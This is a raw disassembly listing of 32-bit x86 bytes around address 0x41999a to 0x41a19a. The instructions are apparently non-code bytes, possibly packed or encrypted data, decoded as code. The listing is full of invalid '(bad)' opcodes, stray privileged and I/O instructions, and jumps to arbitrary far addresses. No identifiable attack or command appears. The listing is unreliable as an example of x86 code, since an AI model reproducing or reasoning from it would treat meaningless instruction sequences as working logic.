  41999a:	aad    0xa
  41999c:	xor    BYTE PTR [edx],dl
  41999e:	(bad)  
  41999f:	mov    cl,0xfb
  4199a1:	mov    ebp,0x74f84fc6
  4199a6:	sbb    al,ch
  4199a8:	(bad)  [edi+0x23]
  4199ab:	or     esi,DWORD PTR [ebx-0x1a]
  4199ae:	cmp    cl,dl
  4199b0:	or     BYTE PTR [edi-0x1c],bh
  4199b3:	rol    DWORD PTR [edi+0x12f058c6],0x72
  4199ba:	lds    edx,FWORD PTR [ebx-0x6e]
  4199bd:	mov    bl,ah
  4199bf:	pop    eax
  4199c0:	clc    
  4199c1:	in     eax,0xd1
  4199c3:	xor    DWORD PTR [edx+0x21],esp
  4199c6:	jp     0x419977
  4199c8:	fwait
  4199c9:	in     al,0x5d
  4199cb:	xor    esp,esp
  4199cd:	pop    edx
  4199ce:	add    eax,0xcacff804
  4199d3:	in     al,dx
  4199d4:	int3   
  4199d5:	pop    eax
  4199d6:	arpl   WORD PTR [edi-0x74],si
  4199d9:	loop   0x419a3b
  4199db:	aas    
  4199dc:	popa   
  4199dd:	lods   al,BYTE PTR ds:[esi]
  4199de:	fadd   DWORD PTR [eax]
  4199e0:	out    0x7d,al
  4199e2:	loop   0x4199c5
  4199e4:	or     bl,BYTE PTR [ebp+0x2c]
  4199e7:	mov    BYTE PTR [edi-0x12],dl
  4199ea:	fcom   DWORD PTR [eax]
  4199ec:	add    eax,0x8a9393d7
  4199f1:	pop    ecx
  4199f2:	shr    DWORD PTR [ebp-0x157f80e4],1
  4199f8:	xchg   ecx,eax
  4199f9:	jg     0x419a16
  4199fb:	xchg   ecx,eax
  4199fc:	aad    0xdf
  4199fe:	mov    DWORD PTR [ebx+0x50],ecx
  419a01:	shl    ebp,cl
  419a03:	sbb    DWORD PTR [edx],edi
  419a05:	cmp    al,0x5d
  419a07:	fmul   DWORD PTR [ebp-0x636b0f90]
  419a0d:	test   al,0x25
  419a0f:	jbe    0x419a3f
  419a11:	add    BYTE PTR [esi],ah
  419a13:	or     eax,0xd665e1a0
  419a18:	icebp  
  419a19:	fbstp  TBYTE PTR [ebp+0x261c935b]
  419a1f:	hlt    
  419a20:	lds    ecx,FWORD PTR [ecx]
  419a22:	cdq    
  419a23:	sbb    BYTE PTR [esi-0x4b],dl
  419a26:	iret   
  419a27:	xor    al,0xd
  419a29:	hlt    
  419a2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a2b:	pop    ecx
  419a2c:	fist   WORD PTR [ebp+0x62]
  419a2f:	cs jne 0x4199ff
  419a32:	push   edx
  419a33:	cs cwde 
  419a35:	mov    ds:0x624fa288,al
  419a3a:	ss lahf 
  419a3c:	jo     0x419ab5
  419a3e:	mov    ds:0x88e18dfc,al
  419a43:	cmp    cl,BYTE PTR cs:[ebx]
  419a46:	nop
  419a47:	jae    0x419a0f
  419a49:	cmp    BYTE PTR ds:0x6bf69284,0x91
  419a50:	xchg   ebx,eax
  419a51:	xlat   BYTE PTR ds:[ebx]
  419a52:	pop    esi
  419a53:	mov    ds:0xe5a94a3b,al
  419a58:	inc    edx
  419a59:	imul   DWORD PTR [eax+0x62eb99bb]
  419a5f:	shr    BYTE PTR [eax+0x6b748edc],0xc6
  419a66:	inc    ebp
  419a67:	js     0x419ada
  419a69:	dec    eax
  419a6a:	std    
  419a6b:	bound  ebx,QWORD PTR [ebx]
  419a6d:	and    BYTE PTR [esi-0x54],dh
  419a70:	int    0xbe
  419a72:	retf   
  419a73:	(bad)  
  419a74:	les    edi,FWORD PTR [edx+0x5]
  419a77:	and    ebp,DWORD PTR [esi+ebx*4+0x1ac85078]
  419a7e:	cs retf 0x171e
  419a82:	loope  0x419a6a
  419a84:	xchg   edx,eax
  419a85:	xchg   esp,eax
  419a86:	jns    0x419a1e
  419a88:	or     eax,esp
  419a8a:	pop    ds
  419a8b:	inc    esp
  419a8c:	mov    eax,ds:0x5e461ee1
  419a91:	mov    dl,BYTE PTR [edi]
  419a93:	or     al,0x94
  419a95:	int    0xeb
  419a97:	inc    edx
  419a98:	stc    
  419a99:	ja     0x419b04
  419a9b:	sti    
  419a9c:	jno    0x419afb
  419a9e:	cld    
  419a9f:	hlt    
  419aa0:	stos   BYTE PTR es:[edi],al
  419aa1:	push   eax
  419aa2:	aam    0x2f
  419aa4:	mov    bh,0xeb
  419aa6:	add    al,0x45
  419aa8:	or     al,0x4c
  419aaa:	ss and al,0x35
  419aad:	cmp    ebx,DWORD PTR [edx-0x3b04694d]
  419ab3:	(bad)  
  419ab4:	mov    ah,0x7c
  419ab6:	add    ebx,eax
  419ab8:	outs   dx,DWORD PTR ds:[esi]
  419ab9:	out    0x55,al
  419abb:	mov    cl,0xf3
  419abd:	push   eax
  419abe:	sub    eax,0x3022b8da
  419ac3:	test   al,al
  419ac5:	inc    ecx
  419ac6:	add    dl,BYTE PTR [ebp+0x71]
  419ac9:	lods   al,BYTE PTR ds:[esi]
  419aca:	or     DWORD PTR [ebx+0xfd89b83],esi
  419ad0:	mov    BYTE PTR [esi],ch
  419ad2:	inc    DWORD PTR [edx+0x4c8750d0]
  419ad8:	fs jmp 0xdf39:0x55dae52d
  419ae0:	sti    
  419ae1:	jno    0x419ab2
  419ae3:	sar    DWORD PTR [eax-0x78],0xf8
  419ae7:	cmp    dl,dh
  419ae9:	add    ch,cl
  419aeb:	jmp    ebp
  419aed:	ret    0xfdab
  419af0:	ror    BYTE PTR [edi-0x471053a2],0x61
  419af7:	div    BYTE PTR [esi-0x5ce1691]
  419afd:	cs sub esp,0x3f
  419b01:	mov    cl,0x71
  419b03:	jno    0x419aac
  419b05:	call   0xc82a266b
  419b0a:	rcl    DWORD PTR [ebx-0x34660681],cl
  419b10:	mov    cs,WORD PTR [ecx]
  419b12:	(bad)  
  419b13:	and    esi,DWORD PTR [edx]
  419b15:	mov    ah,bh
  419b17:	push   esp
  419b18:	xor    ebx,DWORD PTR [esi-0x3ed35893]
  419b1e:	xor    al,0x90
  419b20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b21:	sbb    esi,DWORD PTR [ecx+0x28]
  419b24:	or     esp,DWORD PTR [edi+0x5d]
  419b27:	xchg   BYTE PTR [esi],al
  419b29:	popf   
  419b2a:	sub    eax,ecx
  419b2c:	mov    ch,0xfa
  419b2e:	inc    ebx
  419b2f:	(bad)  [edi-0x75]
  419b32:	fadd   QWORD PTR [esi]
  419b34:	push   ebx
  419b35:	call   0xbdf4:0xdb078c49
  419b3c:	mov    cl,0xdd
  419b3e:	xor    eax,0x53810804
  419b43:	in     eax,dx
  419b44:	dec    ebx
  419b45:	(bad)  
  419b46:	nop
  419b47:	mov    esi,DWORD PTR [esi-0x1b]
  419b4a:	outs   dx,BYTE PTR ds:[esi]
  419b4b:	mov    ds:0x2a4d3862,eax
  419b50:	add    eax,0xb0526744
  419b55:	sbb    al,0xf4
  419b57:	sbb    al,BYTE PTR [edx]
  419b59:	shl    DWORD PTR [ebx-0x14],0x61
  419b5d:	data16 mov al,ds:0x7c802690
  419b63:	sub    al,0x94
  419b65:	mov    ds:0xff7c3e59,eax
  419b6a:	cmp    DWORD PTR [ebx+ebx*4-0x43],esi
  419b6e:	sbb    DWORD PTR [ebx+0x26],0xfffffffc
  419b72:	cwde   
  419b73:	mov    esp,0x416292b6
  419b78:	in     eax,0x6b
  419b7a:	call   0x55b76abf
  419b7f:	xor    DWORD PTR [edx],0xcc92cd6e
  419b85:	mov    BYTE PTR [ebx+ebp*4-0x3d],al
  419b89:	add    ebx,ebp
  419b8b:	cmc    
  419b8c:	aas    
  419b8d:	outs   dx,BYTE PTR ds:[esi]
  419b8e:	dec    esi
  419b8f:	lahf   
  419b90:	adc    eax,0xe2f4e7a3
  419b95:	retf   
  419b96:	pop    ecx
  419b97:	sahf   
  419b98:	push   edi
  419b99:	xchg   edi,eax
  419b9a:	mov    ah,0xf0
  419b9c:	and    DWORD PTR [edx-0x3b],ebx
  419b9f:	fnstcw WORD PTR [esi-0x4e]
  419ba2:	xchg   ebx,eax
  419ba3:	scas   al,BYTE PTR es:[edi]
  419ba4:	push   ecx
  419ba5:	push   ecx
  419ba6:	add    eax,0x82a103bf
  419bab:	es push ss
  419bad:	xchg   esi,ebp
  419baf:	fwait
  419bb0:	xor    ah,BYTE PTR [ebx]
  419bb2:	sar    BYTE PTR [edx+0x23],cl
  419bb5:	pop    ebx
  419bb6:	call   FWORD PTR [ecx+0x100ec721]
  419bbc:	or     BYTE PTR [eax+0x21],al
  419bbf:	or     al,0xb3
  419bc1:	mov    eax,ds:0x7c05cf7a
  419bc6:	push   0xffffff87
  419bc8:	cli    
  419bc9:	mov    BYTE PTR [edx+0x47],bh
  419bcc:	and    esi,DWORD PTR [ebx+0xb63c978]
  419bd2:	shr    eax,1
  419bd4:	dec    edx
  419bd5:	and    DWORD PTR [edi-0x7a11b1c1],esi
  419bdb:	sub    DWORD PTR [ebp-0x3504624b],edi
  419be1:	jl     0x419bfa
  419be3:	lea    eax,[ebx-0x518a18fc]
  419be9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bea:	fcom   DWORD PTR [esi-0x7fa7b8b8]
  419bf0:	repnz lahf 
  419bf2:	arpl   WORD PTR [esp+edx*1],ax
  419bf5:	push   cs
  419bf6:	xchg   esp,eax
  419bf7:	fnstenv [ecx+esi*1]
  419bfa:	nop
  419bfb:	mov    ds:0x7ab9a3d7,al
  419c00:	lods   al,BYTE PTR ds:[esi]
  419c01:	fwait
  419c02:	scas   eax,DWORD PTR es:[edi]
  419c03:	add    DWORD PTR [edx-0x35],eax
  419c06:	xchg   esp,eax
  419c07:	mov    dh,BYTE PTR [edx-0xc]
  419c0a:	sub    DWORD PTR ds:0x13626ce7,ebp
  419c10:	fmul   DWORD PTR [ecx]
  419c12:	push   esp
  419c13:	sub    ecx,ebp
  419c15:	pop    ebx
  419c16:	outs   dx,BYTE PTR ds:[esi]
  419c17:	dec    edx
  419c18:	fwait
  419c19:	adc    eax,0x1fdcee10
  419c1e:	std    
  419c1f:	outs   dx,DWORD PTR ds:[esi]
  419c20:	shr    DWORD PTR [edx-0x159d199e],1
  419c26:	pxor   mm2,QWORD PTR [eax+0x3b]
  419c2a:	shl    BYTE PTR [eax+0x5a72e8],0x8e
  419c31:	adc    al,0xd2
  419c33:	hlt    
  419c34:	or     edx,DWORD PTR [ecx-0x342f9007]
  419c3a:	outs   dx,BYTE PTR ds:[esi]
  419c3b:	sbb    DWORD PTR [ecx],ebp
  419c3d:	sub    cl,ah
  419c3f:	std    
  419c40:	mov    ch,0x62
  419c42:	sub    BYTE PTR [ebp+0x35d03b86],ch
  419c48:	mov    dh,0x3b
  419c4a:	call   0x9bd3:0x704d988b
  419c51:	std    
  419c52:	lea    ecx,[eax+0x23]
  419c55:	repnz push edi
  419c57:	bound  esi,QWORD PTR [edx+0x61]
  419c5a:	adc    bl,BYTE PTR [eax-0x75]
  419c5d:	mov    bh,0x3d
  419c5f:	xlat   BYTE PTR ds:[ebx]
  419c60:	sar    DWORD PTR [ecx-0x56c4d30b],1
  419c66:	pushf  
  419c67:	inc    eax
  419c68:	out    dx,al
  419c69:	cdq    
  419c6a:	push   esp
  419c6b:	dec    edx
  419c6c:	add    BYTE PTR ds:[edx-0x56add271],cl
  419c73:	jl     0x419c26
  419c75:	pop    esp
  419c76:	push   esi
  419c77:	mov    fs,WORD PTR [ecx-0x40734c7c]
  419c7d:	or     DWORD PTR [eax+0x19],ebx
  419c80:	or     DWORD PTR [eax+edx*2],eax
  419c83:	mov    al,0xc1
  419c85:	inc    eax
  419c86:	push   ebp
  419c87:	cmc    
  419c88:	xchg   ebp,eax
  419c89:	shl    ebp,cl
  419c8b:	aam    0xa0
  419c8d:	das    
  419c8e:	adc    BYTE PTR [ecx-0x5396f2f7],ah
  419c94:	scas   al,BYTE PTR es:[edi]
  419c95:	call   0x0:0xfb
	...
  419d14:	and    BYTE PTR [edi-0x200729d],bl
  419d1a:	out    dx,al
  419d1b:	mov    edi,0x4100ab8e
  419d20:	pop    esi
  419d21:	mov    ebp,0x3d482b83
  419d26:	add    DWORD PTR [eax],eax
  419d28:	imul   eax,DWORD PTR [edi],0x0
  419d2b:	add    bl,bh
  419d2d:	int    0xf7
  419d2f:	loope  0x419d67
  419d31:	inc    esi
  419d32:	jl     0x419d96
  419d34:	mov    esp,0x995aba04
  419d39:	fistp  WORD PTR [eax-0x7104fa88]
  419d3f:	mov    al,ds:0x598b9b99
  419d44:	xchg   edi,eax
  419d45:	xchg   esi,eax
  419d46:	cs icebp 
  419d48:	push   ebx
  419d49:	in     al,0x3b
  419d4b:	pop    edx
  419d4c:	pop    ebp
  419d4d:	ficomp DWORD PTR [edx]
  419d4f:	nop
  419d50:	pmulhuw mm2,QWORD PTR [eax]
  419d53:	push   es
  419d54:	jne    0x419cf9
  419d56:	push   edx
  419d57:	fcomi  st,st(5)
  419d59:	in     al,0x67
  419d5b:	mov    edi,0xc55b3b06
  419d60:	icebp  
  419d61:	push   edx
  419d62:	mov    ebx,0x37cff719
  419d67:	xchg   DWORD PTR [edx-0x6d],eax
  419d6a:	add    eax,0x6457fb1c
  419d6f:	test   BYTE PTR [eax+ebp*2+0x6b],cl
  419d73:	xor    edi,DWORD PTR [edi+0x5b80ee49]
  419d79:	es pop eax
  419d7b:	call   0x88e1:0x1835e052
  419d82:	mov    bh,0x2b
  419d84:	jb     0x419df1
  419d86:	pop    es
  419d87:	(bad)  
  419d88:	cmp    ah,BYTE PTR [ebx]
  419d8a:	(bad)  
  419d8b:	enter  0xf39d,0x9f
  419d8f:	aas    
  419d90:	fs cli 
  419d92:	into   
  419d93:	sub    BYTE PTR [edx+edx*8+0x75],al
  419d97:	les    ecx,FWORD PTR [ebp-0x3aba9599]
  419d9d:	mov    ebp,?
  419d9f:	sub    ecx,edx
  419da1:	dec    bl
  419da3:	stos   DWORD PTR es:[edi],eax
  419da4:	pop    esp
  419da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419da6:	adc    BYTE PTR ds:0xed2a42d8,dl
  419dac:	jge    0x419dd5
  419dae:	ror    BYTE PTR [eax+0x4a3c6eea],0x73
  419db5:	loop   0x419e36
  419db7:	iret   
  419db8:	mov    eax,0x61aeb17f
  419dbd:	addr16 cs inc esp
  419dc0:	mov    edi,0xf86c6232
  419dc5:	test   DWORD PTR [edx+0x14],esi
  419dc8:	cmp    bl,al
  419dca:	popf   
  419dcb:	xor    cl,BYTE PTR [edx]
  419dcd:	mov    ds:0xe3a040c,al
  419dd2:	xchg   cl,al
  419dd4:	(bad)  
  419dd6:	mov    ecx,0xe3edb7ab
  419ddb:	push   ebp
  419ddc:	in     eax,0x70
  419dde:	or     DWORD PTR [edi],0x1e696641
  419de4:	stos   BYTE PTR es:[edi],al
  419de5:	fmul   QWORD PTR [edi+0x46]
  419de8:	(bad)  [ecx-0x56f67c58]
  419dee:	into   
  419def:	inc    ebp
  419df0:	in     eax,dx
  419df1:	imul   esp,ebx,0xffffffa3
  419df4:	push   esi
  419df5:	dec    esp
  419df6:	jbe    0x419de0
  419df8:	pop    esp
  419df9:	inc    esi
  419dfa:	ret    
  419dfb:	cs sbb esp,ebp
  419dfe:	fmul   QWORD PTR [esi+0x78]
  419e01:	pop    ss
  419e02:	pop    edx
  419e03:	or     dl,BYTE PTR [edi-0x11]
  419e06:	inc    edi
  419e07:	mov    edx,0xc9da7de5
  419e0c:	mov    ch,0xc1
  419e0e:	mov    eax,ds
  419e10:	stos   BYTE PTR es:[edi],al
  419e11:	clc    
  419e12:	mov    ds:0x91faa65a,al
  419e17:	cmp    al,bl
  419e19:	mov    bl,0xd
  419e1b:	nop
  419e1c:	aam    0xe7
  419e1e:	jg     0x419dad
  419e20:	or     eax,ebp
  419e22:	adc    esp,DWORD PTR [edi+eiz*1+0x5e]
  419e26:	cs ret 0x78a7
  419e2a:	call   0x5574:0x461e90e2
  419e31:	push   0x5e
  419e33:	fsubr  st,st(7)
  419e35:	push   ebp
  419e36:	mov    esp,0xab7e4e4a
  419e3b:	push   eax
  419e3c:	ss inc ecx
  419e3e:	retf   0x5171
  419e41:	xchg   DWORD PTR [ebx-0x46824911],ecx
  419e47:	fmul   DWORD PTR [esi]
  419e49:	aaa    
  419e4a:	dec    ebx
  419e4b:	push   ss
  419e4c:	push   esp
  419e4d:	nop
  419e4e:	add    DWORD PTR [eax+0x4aa57b3a],ebx
  419e54:	sub    al,0x45
  419e56:	jnp    0x419ea4
  419e58:	cmp    eax,0x76c076c1
  419e5d:	ret    
  419e5e:	fisubr WORD PTR [eax+esi*2+0x17]
  419e62:	inc    esp
  419e63:	sti    
  419e64:	int3   
  419e65:	xor    dl,BYTE PTR [esi]
  419e67:	in     eax,0x77
  419e69:	arpl   WORD PTR [eax+esi*4-0x55],sp
  419e6d:	arpl   WORD PTR [esi-0x615daf7],ax
  419e73:	pop    esi
  419e74:	xchg   edi,eax
  419e75:	mov    esi,0xdc9a21e7
  419e7a:	push   eax
  419e7b:	xor    edi,DWORD PTR [esi]
  419e7d:	call   0x937de706
  419e82:	xchg   ebp,eax
  419e83:	addr16 xchg edi,eax
  419e85:	aas    
  419e86:	stos   BYTE PTR es:[edi],al
  419e87:	js     0x419e54
  419e89:	jb     0x419e34
  419e8b:	in     eax,0x81
  419e8d:	jb     0x419efc
  419e8f:	push   ebp
  419e90:	or     eax,0x66ae7f80
  419e95:	adc    ah,ch
  419e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e98:	push   edx
  419e99:	(bad)  
  419e9a:	fs je  0x419eb3
  419e9d:	jnp    0x419ef9
  419e9f:	(bad)  
  419ea0:	in     al,0xd8
  419ea2:	sub    esi,edi
  419ea4:	xor    eax,0x677e5edf
  419ea9:	lahf   
  419eaa:	mov    al,ds:0x445eb7a3
  419eaf:	mov    ds:0x98b3c93d,eax
  419eb4:	jne    0x419eb2
  419eb6:	cmp    BYTE PTR ds:0x15bfa240,bh
  419ebc:	jg     0x419eb3
  419ebe:	or     DWORD PTR [ebp+0x717f71bf],ebp
  419ec4:	lds    edx,FWORD PTR [edi-0x24]
  419ec7:	daa    
  419ec8:	push   edx
  419ec9:	call   0x3599288a
  419ece:	(bad)  
  419ecf:	dec    edx
  419ed0:	mov    edi,0xd3dd5161
  419ed5:	cmp    al,0x29
  419ed7:	xlat   BYTE PTR ds:[ebx]
  419ed8:	rcl    BYTE PTR [esi-0x4c],0xac
  419edc:	pop    ds
  419edd:	(bad)  
  419ede:	ficomp DWORD PTR [ecx*4+0x409922e3]
  419ee5:	ficom  WORD PTR [ecx+0x3d20913a]
  419eeb:	das    
  419eec:	icebp  
  419eed:	ret    
  419eee:	pusha  
  419eef:	jbe    0x419ea5
  419ef1:	ja     0x419ed1
  419ef3:	adc    ebp,esi
  419ef5:	pop    es
  419ef6:	xchg   ebx,eax
  419ef7:	sahf   
  419ef8:	add    al,0x81
  419efa:	xchg   edi,eax
  419efb:	adc    eax,0xc1581924
  419f00:	addr16 test al,0x68
  419f03:	xchg   edi,eax
  419f04:	jo     0x419eeb
  419f06:	push   esp
  419f07:	fwait
  419f08:	arpl   WORD PTR [esi+edi*1],ax
  419f0b:	pushf  
  419f0c:	test   al,0x79
  419f0e:	mov    esp,0x145e6749
  419f13:	xchg   ecx,eax
  419f14:	aaa    
  419f15:	sbb    ah,BYTE PTR [edx-0x7bdb64af]
  419f1b:	lods   eax,DWORD PTR ds:[esi]
  419f1c:	sbb    dl,BYTE PTR [ecx-0x70f4d3f0]
  419f22:	xlat   BYTE PTR ds:[ebx]
  419f23:	outs   dx,DWORD PTR ds:[esi]
  419f24:	fcom   st(7)
  419f26:	pop    ebx
  419f27:	mov    esp,0xf57c67e
  419f2c:	or     eax,0x46a55607
  419f31:	adc    cl,bh
  419f33:	jb     0x419ef4
  419f35:	retf   
  419f36:	rcl    BYTE PTR [ecx-0x27],0xed
  419f3a:	hlt    
  419f3b:	imul   edi,edx,0xffffffa4
  419f3e:	cld    
  419f3f:	push   es
  419f40:	outs   dx,DWORD PTR ds:[esi]
  419f41:	cwde   
  419f42:	outs   dx,DWORD PTR ds:[esi]
  419f43:	pop    ss
  419f44:	jmp    0x7844:0xa39b5bf2
  419f4b:	xchg   ebx,eax
  419f4c:	push   0x735023a4
  419f51:	dec    ebx
  419f52:	popa   
  419f53:	scas   al,BYTE PTR es:[edi]
  419f54:	cmp    BYTE PTR [esi],dh
  419f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f57:	mov    ds:0x8a37761a,al
  419f5c:	jmp    0x5aa7:0x806ffbfa
  419f63:	aad    0x44
  419f65:	mov    BYTE PTR [edx-0x3840652c],bl
  419f6b:	in     al,0x4e
  419f6d:	sub    eax,0x8f31fa69
  419f72:	add    edi,eax
  419f74:	mov    ds:0x93c369fa,al
  419f79:	jl     0x419f9a
  419f7b:	in     al,dx
  419f7c:	addr16 jbe 0x419fcd
  419f7f:	ss ret 0xbfe5
  419f83:	js     0x419fb2
  419f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f86:	xchg   edi,eax
  419f87:	test   DWORD PTR [edi],0xf3834af7
  419f8d:	aam    0xe3
  419f8f:	pop    ds
  419f90:	iret   
  419f91:	dec    edx
  419f92:	or     ah,BYTE PTR cs:[edx-0x30ff30c0]
  419f99:	shr    BYTE PTR [eax],1
  419f9b:	lahf   
  419f9c:	fs or  al,0x82
  419f9f:	pop    esi
  419fa0:	push   ebx
  419fa1:	adc    edx,DWORD PTR ds:0x924c24f0
  419fa7:	jecxz  0x41a003
  419fa9:	push   eax
  419faa:	lea    esp,[edx-0x3835ccd]
  419fb0:	jns    0x41a00f
  419fb2:	leave  
  419fb3:	(bad)  
  419fb4:	je     0x41a01b
  419fb6:	fstp   TBYTE PTR [eax-0x4ffb9b2d]
  419fbc:	push   edi
  419fbd:	inc    ebp
  419fbe:	popa   
  419fbf:	adc    al,0x2b
  419fc1:	or     edi,edi
  419fc3:	xor    esp,DWORD PTR [ebx-0x49]
  419fc6:	jl     0x419fc7
  419fc8:	lahf   
  419fc9:	leave  
  419fca:	xchg   esp,eax
  419fcb:	call   DWORD PTR [eax-0x7080fda7]
  419fd1:	jno    0x41a01d
  419fd3:	rcr    ecx,0x51
  419fd6:	rcr    ah,0x79
  419fd9:	int    0x61
  419fdb:	mov    bl,bh
  419fdd:	out    dx,al
  419fde:	jae    0x41a04e
  419fe0:	int    0x87
  419fe2:	lock mov eax,0xc62d4355
  419fe8:	cmc    
  419fe9:	loope  0x41a019
  419feb:	ficomp DWORD PTR [eax-0x1e95b2f4]
  419ff1:	push   ebx
  419ff2:	mov    dh,0xaa
  419ff4:	iret   
  419ff5:	and    edx,0xe7e6b766
  419ffb:	ja     0x419f83
  419ffd:	inc    eax
  419ffe:	repnz sti 
  41a000:	inc    edx
  41a001:	push   edx
  41a002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a003:	mov    eax,0x7062ab02
  41a008:	mov    bl,0xd7
  41a00a:	cld    
  41a00b:	and    ch,BYTE PTR [ecx]
  41a00d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a00e:	or     al,0x9f
  41a010:	xchg   esi,eax
  41a011:	aaa    
  41a012:	out    0xf8,al
  41a014:	jnp    0x419ff8
  41a016:	pop    esp
  41a017:	push   edi
  41a018:	and    ah,bl
  41a01a:	mov    es,WORD PTR [ebx+0x6f]
  41a01d:	test   DWORD PTR [ebx],edi
  41a01f:	ret    
  41a020:	addr16 xchg cx,ax
  41a023:	pusha  
  41a024:	or     ch,BYTE PTR [ebx-0x2d]
  41a027:	inc    ecx
  41a028:	jg     0x419ffb
  41a02a:	mov    WORD PTR [ecx],?
  41a02c:	lds    edi,FWORD PTR [edx]
  41a02e:	fcmovnbe st,st(3)
  41a030:	dec    BYTE PTR [ecx]
  41a032:	jns    0x41a060
  41a034:	fdiv   DWORD PTR [ebx-0x3d2fc18e]
  41a03a:	fwait
  41a03b:	retf   0x8f1
  41a03e:	push   ss
  41a03f:	inc    ebp
  41a040:	lds    ebx,FWORD PTR [edi]
  41a042:	jb     0x41a097
  41a044:	add    eax,0xffcf17e
  41a049:	adc    cl,BYTE PTR [edx+esi*2-0x57a6a9d2]
  41a050:	pusha  
  41a051:	push   esi
  41a052:	mov    edi,0x9fc6c00b
  41a057:	xchg   edi,eax
  41a058:	je     0x41a00b
  41a05a:	xchg   ebp,eax
  41a05b:	daa    
  41a05c:	ins    BYTE PTR es:[di],dx
  41a05e:	mov    eax,0xb7bf917
  41a063:	dec    edx
  41a064:	lds    ebp,FWORD PTR [ebx+0x7ec5887f]
  41a06a:	xchg   esi,eax
  41a06b:	aad    0xe
  41a06d:	repnz xor cl,BYTE PTR cs:[ebp+0x1]
  41a072:	sar    DWORD PTR [ebp+0x75],0xed
  41a076:	aad    0xcb
  41a078:	push   es
  41a079:	mov    eax,0x46e0332d
  41a07e:	mov    bh,0x56
  41a080:	(bad)  
  41a081:	jp     0x41a031
  41a083:	mov    edi,DWORD PTR [esp+edx*1-0x47]
  41a087:	call   0xe3c7:0xb18c565
  41a08e:	mov    ah,0x6d
  41a090:	icebp  
  41a091:	sahf   
  41a092:	xlat   BYTE PTR ds:[ebx]
  41a093:	and    al,0xec
  41a095:	and    al,0x7
  41a097:	xchg   esp,eax
  41a098:	neg    bh
  41a09a:	xchg   ecx,eax
  41a09b:	aas    
  41a09c:	and    esi,DWORD PTR [ecx+0x13]
  41a09f:	jecxz  0x41a0ed
  41a0a1:	mov    dh,0xd6
  41a0a3:	test   al,0x9f
  41a0a5:	cmp    esp,DWORD PTR [edx+0x50]
  41a0a8:	jnp    0x41a107
  41a0aa:	or     BYTE PTR [ebx+0x8],bl
  41a0ad:	xor    ebp,DWORD PTR [edx+0x645429a4]
  41a0b3:	push   edi
  41a0b4:	dec    ebp
  41a0b5:	stc    
  41a0b6:	or     al,0x7b
  41a0b8:	outs   dx,BYTE PTR ds:[esi]
  41a0b9:	mov    eax,ds:0x22dcfcd7
  41a0be:	mul    BYTE PTR [edx]
  41a0c0:	push   eax
  41a0c1:	or     BYTE PTR [ebx+0x3c],dl
  41a0c4:	adc    dl,BYTE PTR [ecx]
  41a0c6:	retf   0xf5fd
  41a0c9:	pop    edx
  41a0ca:	outs   dx,BYTE PTR ds:[esi]
  41a0cb:	jmp    0xce9e:0xf243fe86
  41a0d2:	arpl   si,cx
  41a0d4:	aam    0xac
  41a0d6:	pop    ebp
  41a0d7:	jb     0x41a0b9
  41a0d9:	jo     0x41a09c
  41a0db:	push   0xffffffde
  41a0dd:	das    
  41a0de:	das    
  41a0df:	sub    eax,0xda0d04e5
  41a0e4:	jl     0x41a06f
  41a0e6:	leave  
  41a0e7:	sbb    DWORD PTR [ecx+0x653481dd],ecx
  41a0ed:	sub    DWORD PTR [edx-0x17],ebp
  41a0f0:	jge    0x41a138
  41a0f2:	sahf   
  41a0f3:	pop    ebx
  41a0f4:	and    dl,dh
  41a0f6:	mov    bl,0x18
  41a0f8:	push   edi
  41a0f9:	mov    ebx,DWORD PTR [ebp+ecx*8+0x51]
  41a0fd:	adc    ah,ch
  41a0ff:	dec    ebp
  41a100:	add    bh,bl
  41a102:	ret    
  41a103:	jp     0x41a150
  41a105:	imul   ebp,ebx,0x90f46e67
  41a10b:	push   esi
  41a10c:	int3   
  41a10d:	imul   ebp,DWORD PTR [edi+0x7a],0x3ac7500c
  41a114:	xchg   ebx,eax
  41a115:	cdq    
  41a116:	out    dx,eax
  41a117:	in     eax,0xb0
  41a119:	loop   0x41a0ed
  41a11b:	push   0xffffffb4
  41a11d:	imul   BYTE PTR [esi]
  41a11f:	pop    ss
  41a120:	pop    ss
  41a121:	jle    0x41a0cd
  41a123:	mov    al,0xb7
  41a125:	add    DWORD PTR [eax],ebp
  41a127:	xchg   DWORD PTR [ebx+0x7032ae71],ecx
  41a12d:	nop
  41a12e:	fcom   DWORD PTR [ecx-0x7b]
  41a131:	push   es
  41a132:	fnsave [ebp+0x73]
  41a135:	adc    BYTE PTR [eax],ah
  41a137:	inc    eax
  41a138:	jns    0x41a19d
  41a13a:	(bad)  
  41a13c:	and    eax,0x6a4b2a75
  41a141:	(bad)  
  41a143:	jp     0x41a16c
  41a145:	sbb    ebp,DWORD PTR [edi-0x5067d3bf]
  41a14b:	jg     0x41a123
  41a14d:	inc    ecx
  41a14e:	stc    
  41a14f:	sub    eax,0x9b017d8c
  41a154:	xor    BYTE PTR [esi+0xf],0x3e
  41a158:	or     cl,ch
  41a15a:	or     esi,DWORD PTR ds:0x334aac34
  41a160:	repz cdq 
  41a162:	mov    DWORD PTR [ecx-0x7],eax
  41a165:	sti    
  41a166:	fstp   DWORD PTR [ecx]
  41a168:	and    DWORD PTR [edi+esi*2],0xffffffa9
  41a16c:	jmp    0x41a13e
  41a16e:	stc    
  41a16f:	ror    BYTE PTR [esi+edx*1-0x3b],0x69
  41a174:	or     edi,ebp
  41a176:	and    esp,DWORD PTR [edx-0x1]
  41a179:	push   ebx
  41a17a:	and    BYTE PTR [edi+0x6e],0x12
  41a17e:	sub    BYTE PTR [ecx],0xf3
  41a181:	sbb    dl,dh
  41a183:	cmp    DWORD PTR [edi-0x30],edi
  41a186:	adc    eax,0x99c28e93
  41a18c:	cwde   
  41a18d:	pop    esi
  41a18e:	lods   eax,DWORD PTR ds:[esi]
  41a18f:	mov    bh,0xd7
  41a191:	push   es
  41a192:	popf   
  41a193:	ins    BYTE PTR es:[edi],dx
  41a194:	dec    ebp
  41a195:	xchg   esp,eax
  41a196:	xchg   edx,eax
  41a197:	push   ds
  41a198:	xchg   edx,eax
  41a199:	dec    esi
  41a19a:	dec    ecx
